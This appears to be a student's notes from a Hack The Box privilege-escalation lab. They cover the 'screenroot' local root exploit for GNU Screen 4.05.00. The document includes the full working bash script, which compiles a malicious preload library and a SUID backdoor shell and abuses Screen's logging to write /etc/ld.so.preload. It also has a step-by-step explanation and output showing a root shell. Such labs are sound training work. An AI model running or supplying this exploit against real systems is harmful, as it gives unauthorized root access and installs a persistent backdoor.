
---

When a Linux system execute any files, it will read the file and preload the `.so` files(dynamic libraries) that were listed.

```bash
hcx05@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```


```sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
// Tell the compilar that while this library been loaded, execute 
// dropshell immediately.
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

1. Preparation of the Malicious Payloads
First, the exploit creates two separate C programs. One is a library called a "Shared Object" (.so), and the other is a simple "Backdoor" executable. The key trick here is inside the library: it uses a special "Constructor" attribute which tells the Linux operating system to run the code immediately when the file is loaded, even before the main program starts. This hidden code is designed to change the owner of our backdoor executable to Root and grant it SUID permissions, allowing it to run with administrative power later.

2. Exploiting Screen to Hijack System Configs
Next, the exploit targets the GNU Screen utility because it has SUID Root privileges, meaning it can write files in protected areas. By using the "-L" (Log) flag, we trick Screen into creating a system configuration file called "/etc/ld.so.preload". We then force Screen to "log" the file path of our malicious library into this configuration. We include a newline character (\x0a) to make sure our path sits on its own line, bypassing any junk text or headers that Screen automatically writes at the start of the log file.

3. Triggering the Injection and Cleanup
Finally, the exploit runs any command that uses Screen (like "screen -ls"). When this happens, the Linux dynamic linker sees the new "/etc/ld.so.preload" file and automatically loads our malicious library into memory with Root privileges. The "Constructor" code inside the library triggers instantly, turning our backdoor into a Root-owned SUID tool. The library then immediately deletes (unlinks) the preload file to hide the evidence and prevent the entire system from crashing. Now, we simply run the backdoor to get a permanent Root shell.

```bash
hcx05@htb[/htb]$ ./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-mrb3n.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

